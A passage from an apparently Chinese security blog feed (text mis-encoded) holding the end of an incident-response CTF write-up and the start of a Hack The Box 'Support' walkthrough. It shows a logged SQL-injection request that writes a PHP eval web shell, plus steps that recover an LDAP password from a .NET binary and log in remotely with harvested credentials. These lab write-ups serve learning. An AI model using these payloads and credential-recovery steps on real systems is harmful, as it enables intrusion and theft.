class="hljs-number">12</span>])<br>            state[<span class="hljs-number">2</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">13</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">2</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">13</span>])<br>            state[<span class="hljs-number">3</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">14</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">3</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">14</span>])<br>        <br>        block = <span class="hljs-built_in">bytearray</span>()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            block.extend(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, (state[i] + <span class="hljs-variable language_">self</span>.state[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span>))<br>        <span class="hljs-variable language_">self</span>.state[<span class="hljs-number">12</span>] = (<span class="hljs-variable language_">self</span>.state[<span class="hljs-number">12</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(block)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">keystream</span>(<span class="hljs-params">self</span>) -&gt; Generator[<span class="hljs-built_in">bytes</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">yield</span> <span class="hljs-variable language_">self</span>._generate_block()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    key_bytes = key.ljust(<span class="hljs-number">32</span>, <span class="hljs-string">&#x27;\0&#x27;</span>).encode()[:<span class="hljs-number">32</span>]<br>    chacha = ChaCha20(key_bytes, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span>)<br>    plain = <span class="hljs-built_in">bytearray</span>()<br>    <br>    <span class="hljs-keyword">for</span> i, (c, k) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(ciphertext, (b <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> chacha.keystream() <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> block))):<br>        plain.append(((c - <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>) ^ k)<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plain)<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;&quot;12 1D 58 7A 7F 60 FE 96 74 D6 7B 56 67 CE 72 3F F2 D2 CE 47 19 59 9B 09 42 07 2C 55 B7 44 10 DE 46 E5 38 B7 74 95 78 42 95 BD 7D B5 64 55 CD 52 8D D2 69 C6 10 5F 82 29 29 9D 30 F6 B4&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br><br><span class="hljs-built_in">print</span>(decrypt(ciphertext, <span class="hljs-string">&quot;qewuri&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;sierting_666_fpdsajf[psdfljnwqrlqwhperhqwoeiurhqweourhp&#125;</span><br></code></pre></td></tr></table></figure><h1 id="åº”æ€¥è¡ŒåŠ¨-1"><a href="#åº”æ€¥è¡ŒåŠ¨-1" class="headerlink" title="åº”æ€¥è¡ŒåŠ¨-1"></a>åº”æ€¥è¡ŒåŠ¨-1</h1><p>è¿›å…¥ç›®å½• <code>C:\Program Files (x86)\RealFriend\Rap Server\Logs</code> ä¸‹æŸ¥çœ‹ <code>access.log</code> æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/82dc25c67f21f244.png"></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">56</span>.<span class="hljs-number">128</span> - - [<span class="hljs-number">21</span>/Apr/<span class="hljs-number">2025</span>:<span class="hljs-number">18</span>:<span class="hljs-number">08</span>:<span class="hljs-number">51</span> +<span class="hljs-number">0800</span>] &quot;GET /AgentBoard.XGI?user=-<span class="hljs-number">1</span><span class="hljs-variable">%27+union+select+1%</span><span class="hljs-number">2</span>C<span class="hljs-variable">%27%</span><span class="hljs-number">3</span>c<span class="hljs-variable">%3fphp+eval%</span><span class="hljs-number">28</span><span class="hljs-variable">%24_POST%</span><span class="hljs-number">5</span>b<span class="hljs-variable">%22cmd%</span><span class="hljs-number">22</span><span class="hljs-variable">%5d%</span><span class="hljs-number">29</span><span class="hljs-variable">%3b%</span><span class="hljs-number">3</span>f<span class="hljs-variable">%3e%</span><span class="hljs-number">27</span>+into+outfile+<span class="hljs-variable">%22C%</span><span class="hljs-number">3</span>A<span class="hljs-variable">%5C%</span><span class="hljs-number">5</span>CProgram<span class="hljs-variable">%5C+Files%</span><span class="hljs-number">5</span>C+<span class="hljs-variable">%5C%</span><span class="hljs-number">28</span>x86<span class="hljs-variable">%5C%</span><span class="hljs-number">29</span><span class="hljs-variable">%5C%</span><span class="hljs-number">5</span>CRealFriend<span class="hljs-variable">%5C%</span><span class="hljs-number">5</span>CRap<span class="hljs-variable">%5C+Server%</span><span class="hljs-number">5</span>C<span class="hljs-variable">%5CWebRoot%</span><span class="hljs-number">5</span>C<span class="hljs-variable">%5Cpdyfzr7k.php%</span><span class="hljs-number">22</span>+--+-&amp;<span class="hljs-built_in">cmd</span>=UserLogin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>&quot; <span class="hljs-number">200</span> <span class="hljs-number">416</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.56.128</span> <span class="hljs-number">21</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2025</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="åº”æ€¥è¡ŒåŠ¨-2"><a href="#åº”æ€¥è¡ŒåŠ¨-2" class="headerlink" title="åº”æ€¥è¡ŒåŠ¨-2"></a>åº”æ€¥è¡ŒåŠ¨-2</h1><p>æŸ¥çœ‹ ie æµè§ˆå™¨å†å²è®°å½•ï¼Œæœ‰ä¸€ä¸ª <code>rclone.conf</code> æ–‡ä»¶</p><img src="https://img.dkdun.cn/v1/2025/12/9679c327688ad0e1.png" alt="image-20250426120829526" style="zoom:45%;" /><p>ç‚¹å‡»æŸ¥çœ‹</p><img src="https://img.dkdun.cn/v1/2025/12/79e1de4c8155c75a.png" alt="image-20250426120858594" style="zoom:60%;" /><p>æ‹¿åˆ° flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;oisienfpqwlmdouydrsbhuisjAUGEDW&#125;</span><br></code></pre></td></tr></table></figure><h1 id="åº”æ€¥è¡ŒåŠ¨-3"><a href="#åº”æ€¥è¡ŒåŠ¨-3" class="headerlink" title="åº”æ€¥è¡ŒåŠ¨-3"></a>åº”æ€¥è¡ŒåŠ¨-3</h1><p><img src="https://img.dkdun.cn/v1/2025/12/aa90a871da778555.png" alt="image-20250426175407247"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">21</span> <span class="hljs-number">23</span>:<span class="hljs-number">39</span>:<span class="hljs-number">28</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="åº”æ€¥è¡ŒåŠ¨-4"><a href="#åº”æ€¥è¡ŒåŠ¨-4" class="headerlink" title="åº”æ€¥è¡ŒåŠ¨-4"></a>åº”æ€¥è¡ŒåŠ¨-4</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img src="https://img.dkdun.cn/v1/2025/12/40e15b1f7c5876f5.png"></p><img src="https://img.dkdun.cn/v1/2025/12/f6e723dc9db13cc8.png" alt="image-20250426132516925" style="zoom:67%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag1</span><span class="hljs-template-variable">&#123;zheshi&#125;</span><br></code></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><img src="https://img.dkdun.cn/v1/2025/12/850d02bbc0f63cb9.png" alt="image-20250426142034550" style="zoom:50%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag2</span><span class="hljs-template-variable">&#123;yige&#125;</span><br></code></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><img src="https://img.dkdun.cn/v1/2025/12/dc523c8bdd5e806b.png" alt="image-20250426182012661" style="zoom: 80%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;ni&#125;</span><br></code></pre></td></tr></table></figure><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„æ²¡æœ‰åŠæ³•æ¢å¤å¿«ç…§ï¼Œå‚è€ƒ <a href="https://www.n0o0b.com/archives/solar-4#%E5%BA%94%E6%80%A5%E8%A1%8C%E5%8A%A8-4">nOo0b å¸ˆå‚…çš„æ–¹æ³•</a>ï¼ŒæŸ¥çœ‹ vmtools ä¼ è¾“çš„æ¥å£ï¼Œå‘ç°äº†è¢«åˆ é™¤çš„å¯ç–‘çš„ <code>Svchost.exe</code></p><img src="https://img.dkdun.cn/v1/2025/12/a79d7f87f52bd480.png" alt="image-20250506142816501" style="zoom:67%;" /><p>æ¢å¤æ–‡ä»¶ä¹‹åï¼ŒæŸ¥çœ‹å±æ€§æ‰¾åˆ° flag</p><img src="https://img.dkdun.cn/v1/2025/12/0fe1ca0317cfe6ea.png" alt="image-20250506142717548" style="zoom:67%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag4</span><span class="hljs-template-variable">&#123;xiangbudaodeflag&#125;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ flag ä¸º</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;zheshiyigenixiangbudaodeflag&#125;</span><br></code></pre></td></tr></table></figure><h1 id="åº”æ€¥è¡ŒåŠ¨-5"><a href="#åº”æ€¥è¡ŒåŠ¨-5" class="headerlink" title="åº”æ€¥è¡ŒåŠ¨-5"></a>åº”æ€¥è¡ŒåŠ¨-5</h1><p>æ‰“å¼€ç”¨æˆ·çš„å…¬ç”¨æ–‡ä»¶å¤¹</p><img src="https://img.dkdun.cn/v1/2025/12/28c3351c15fd579f.png" alt="image-20250426120143872" style="zoom:65%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Encryptor123.exe&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Support</title>
    <link href="/2025/04/25/HTB-Support/"/>
    <url>/2025/04/25/HTB-Support/</url>
    
    <content type="html"><![CDATA[<p>SMB æ–‡ä»¶å…±äº«ï¼ŒdnSpy é€†å‘åˆ†æï¼ŒLDAP ä¿¡æ¯æ”¶é›†ï¼ŒNeo4j+BloodHound æŸ¥çœ‹åŸŸå…³ç³»å›¾ï¼ŒRBCD æ”»å‡»</p><span id="more"></span><h1 id="nmap-ç«¯å£æ‰«æ"><a href="#nmap-ç«¯å£æ‰«æ" class="headerlink" title="nmap ç«¯å£æ‰«æ"></a>nmap ç«¯å£æ‰«æ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# nmap -sS -sV -A -Pn 10.10.11.174<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 20:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.174<br>Host is up (1.9s latency).<br>Not shown: 989 filtered tcp ports (no-response)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-18 12:58:29Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  tcpwrapped<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)<br>3269/tcp open  tcpwrapped<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running (JUST GUESSING): Microsoft Windows 2022 (88%)<br>Aggressive OS guesses: Microsoft Windows Server 2022 (88%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 3 hops<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time:<br>|   <span class="hljs-built_in">date</span>: 2025-04-18T13:01:02<br>|_  start_date: N/A<br>| smb2-security-mode:<br>|   3:1:1:<br>|_    Message signing enabled and required<br><br>TRACEROUTE (using port 445/tcp)<br>HOP RTT        ADDRESS<br>1   0.39 ms    butt3rf1y.mshome.net (172.30.144.1)<br>2   3761.06 ms 10.10.16.1<br>3   3761.11 ms 10.10.11.174<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 603.02 seconds<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥è¿™ä¹ˆå¤šï¼Œç”±æ‰«æç»“æœå¾—çŸ¥è¿™æ˜¯ä¸€ä¸ª AD çš„ DC æœåŠ¡å™¨ï¼Œæœ‰ä¸€ä¸ª <code>support.htb</code> åŸŸ</p><h1 id="æšä¸¾-DNS"><a href="#æšä¸¾-DNS" class="headerlink" title="æšä¸¾ DNS"></a>æšä¸¾ DNS</h1><p>æ‰€ä»¥æ¥ä¸‹æ¥ç”¨ dig æ¥æŸ¥è¯¢ä¸€ä¸‹ DNS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig @10.10.11.174 support.htb any +short<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/1082965c10d13c13.png" alt="image-20250419021620899" style="zoom:80%;" /><p>æ‰«å‡ºçš„ç»“æœç¡®è®¤äº†æœåŠ¡å™¨çš„åç§°ä¸º <code>dc</code>ï¼ŒåŸŸåä¸º <code>support.htb</code></p><h1 id="åˆ©ç”¨-SMB-è·å–æ–‡ä»¶"><a href="#åˆ©ç”¨-SMB-è·å–æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ SMB è·å–æ–‡ä»¶"></a>åˆ©ç”¨ SMB è·å–æ–‡ä»¶</h1><p>å¼€æ”¾äº† 445 ç«¯å£ï¼Œè¿æ¥æŸ¥çœ‹æœ‰æ— æœ‰ç”¨ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# smbclient -N -L //10.10.11.174<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        NETLOGON        Disk      Logon server share<br>        support-tools   Disk      support staff tools<br>        SYSVOL          Disk      Logon server share<br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ª <code>support-tools</code>ï¼Œé‡Œé¢æœ‰ä¸€äº›å‹ç¼©æ–‡ä»¶å’Œ <code>.exe</code> æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Jul 21 01:01:06 2022<br>  ..                                  D        0  Sat May 28 19:18:25 2022<br>  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022<br>  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022<br>  putty.exe                           A  1273576  Sat May 28 19:20:06 2022<br>  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022<br>  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022<br>  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022<br>  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022<br><br>                4026367 blocks of size 4096. 955496 blocks available<br></code></pre></td></tr></table></figure><p>å°†å¯ç–‘çš„ <code>UserInfo.exe.zip</code> è§£å‹</p><img src="https://img.dkdun.cn/v1/2025/12/ed26b6b20d29d9da.png" alt="image-20250418221658147" style="zoom:80%;" /><p>ç”¨ <code>file</code> å‘½ä»¤æŸ¥çœ‹å‘ç°æ˜¯ <code>.Net</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆç”¨ dnSpy å»åç¼–è¯‘å®ƒ</p><img src="https://img.dkdun.cn/v1/2025/12/c0e22db75788e5e1.png" alt="image-20250418221918624" style="zoom:80%;" /><h1 id="dnSpy-é€†å‘åˆ†æè·å–-LDAP-å¯†ç "><a href="#dnSpy-é€†å‘åˆ†æè·å–-LDAP-å¯†ç " class="headerlink" title="dnSpy é€†å‘åˆ†æè·å– LDAP å¯†ç "></a>dnSpy é€†å‘åˆ†æè·å– LDAP å¯†ç </h1><p>å®šä½åˆ° <code>UserInfo Services</code> ä¸‹çš„ <code>LdapQuery</code> æ„é€ å‡½æ•°</p><img src="https://img.dkdun.cn/v1/2025/12/c21bd8942599b9a8.png" style="zoom: 50%;" /><p>ä» <code>getPassword()</code> ä¸­è·å–å¯†ç ä»¥ç”¨æˆ·å <code>support\\ldap</code> è¿æ¥ <code>LDAP://support.htb</code> è¿›è¡ŒæŸ¥è¯¢</p><p>è·Ÿè¿› <code>getPassword()</code> æ–¹æ³•</p><img src="https://img.dkdun.cn/v1/2025/12/2e1fe820f826c344.png" alt="image-20250418230241205" style="zoom: 67%;" /><p>æ˜æ–‡ å…ˆ base64 åŠ å¯†ç„¶åä¸ <code>223</code> å¼‚æˆ–ï¼Œkey ä¸º <code>armando</code>ï¼Œå› æ­¤è§£å¯†è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>enc_passwd = base64.b64decode(<span class="hljs-string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>)<br>key = <span class="hljs-string">b&quot;armando&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc_passwd)):<br>    result += <span class="hljs-built_in">chr</span>(enc_passwd[i] ^ key[i % <span class="hljs-built_in">len</span>(key)] ^ <span class="hljs-number">223</span>)<br>    <br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>è§£å‡ºæ¥ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œåº”è¯¥å°±æ˜¯å¯†ç </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-symbol">nvEfEK16</span>^<span class="hljs-number">1</span>a<span class="hljs-name">M4</span>$e<span class="hljs-number">7</span>AclUf<span class="hljs-number">8</span>x$tRWxPW<span class="hljs-meta">O1</span><span class="hljs-meta">%</span>lmz<br></code></pre></td></tr></table></figure><h1 id="ldapsearch-æ‰«ææŸ¥æ‰¾ä¿¡æ¯"><a href="#ldapsearch-æ‰«ææŸ¥æ‰¾ä¿¡æ¯" class="headerlink" title="ldapsearch æ‰«ææŸ¥æ‰¾ä¿¡æ¯"></a>ldapsearch æ‰«ææŸ¥æ‰¾ä¿¡æ¯</h1><p>é‚£æ¥ä¸‹æ¥å°±è¯¥çœ‹ LDAP çš„ä¿¡æ¯äº†ï¼Œ389 ç«¯å£è¿è¡Œäº† LDAP æœåŠ¡ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†å¯†ç ï¼Œé‚£ä¹ˆç”¨ <code>ldapsearch</code> æ¥æŸ¥è¯¢ç›¸å…³ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldapsearch -x -H ldap://10.10.11.174:389 -D ldap@support.htb -w <span class="hljs-string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -b <span class="hljs-string">&quot;dc=support,dc=htb&quot;</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/722b1b2ef9c68dce.png" alt="image-20250419032724205" style="zoom: 50%;" /><p>æµè§ˆä¿¡æ¯è§ˆå‘ç°äº† <code>support</code> ç”¨æˆ·çš„ <code>info</code> å­—æ®µ</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">info:</span> Ironside47pleasure40Watchful<br></code></pre></td></tr></table></figure><p>å…¶ä»–çš„ç”¨æˆ· info å­—æ®µéƒ½æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¿™çœ‹èµ·æ¥å°±å¾ˆå¯ç–‘ï¼Œå¯èƒ½æ˜¯å¯†ç ä¹‹ç±»çš„</p><p>å½“æˆå¯†ç ç”¨ Evil-winrm ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i 10.10.11.174 -u <span class="hljs-string">&quot;support&quot;</span> -p <span class="hljs-string">&#x27;Ironside47pleasure40Watchful&#x27;</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/60cc0940fa5d8cf7.png" alt="image-20250419033847918" style="zoom: 40%;" /><p>æ‹¿åˆ° flag</p><h1 id="å¯¹åŸŸè¿›è¡Œä¿¡æ¯æ”¶é›†"><a href="#å¯¹åŸŸè¿›è¡Œä¿¡æ¯æ”¶é›†" class="headerlink" title="å¯¹åŸŸè¿›è¡Œä¿¡æ¯æ”¶é›†"></a>å¯¹åŸŸè¿›è¡Œä¿¡æ¯æ”¶é›†</h1><p>ä½¿ç”¨ <code>Get-ADDomain</code> æŸ¥çœ‹åŸŸä¿¡æ¯</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\support\Desktop&gt; <span class="hljs-built_in">Get-ADDomain</span><br><br><br>AllowedDNSSuffixes                 : &#123;&#125;<br>ChildDomains                       : &#123;&#125;<br>ComputersContainer                 : CN=Computers,DC=support,DC=htb<br>DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb<br>DistinguishedName                  : DC=support,DC=htb<br>DNSRoot                            : support.htb<br>DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb<br>DomainMode                         : Windows2016Domain<br>DomainSID                          : S<span class="hljs-literal">-1-5-21-1677581083-3380853377-188903654</span><br>ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb<br>Forest                             : support.htb<br>InfrastructureMaster               : dc.support.htb<br>LastLogonReplicationInterval       :<br>LinkedGroupPolicyObjects           : &#123;CN=&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D-11D2-945F-00C04FB984F9</span>&#125;,CN=Policies,CN=System,DC=support,DC=htb&#125;<br>LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb<br>ManagedBy                          :<br>Name                               : support<br>NetBIOSName                        : SUPPORT<br>ObjectClass                        : domainDNS<br>ObjectGUID                         : <span class="hljs-number">553</span>cd9a3<span class="hljs-literal">-86c4-4d64-9e85-5146a98c868e</span><br>ParentDomain                       :<br>PDCEmulator                        : dc.support.htb<br>PublicKeyRequiredPasswordRolling   : True<br>QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb<br>ReadOnlyReplicaDirectoryServers    : &#123;&#125;<br>ReplicaDirectoryServers            : &#123;dc.support.htb&#125;<br>RIDMaster                          : dc.support.htb<br>SubordinateReferences              : &#123;DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb&#125;<br>SystemsContainer                   : CN=System,DC=support,DC=htb<br>UsersContainer                     : CN=Users,DC=support,DC=htb<br></code></pre></td></tr></table></figure><p>ä»ä¸­å¯ä»¥å‘ç°è¿™å°æœºå™¨æ˜¯åŸŸ <code>support.htb</code> çš„åŸŸæ§åˆ¶å™¨ï¼ŒæŠŠå®ƒåŠ å…¥æœ¬åœ° host</p><p>é€šè¿‡ <code>whoami</code> 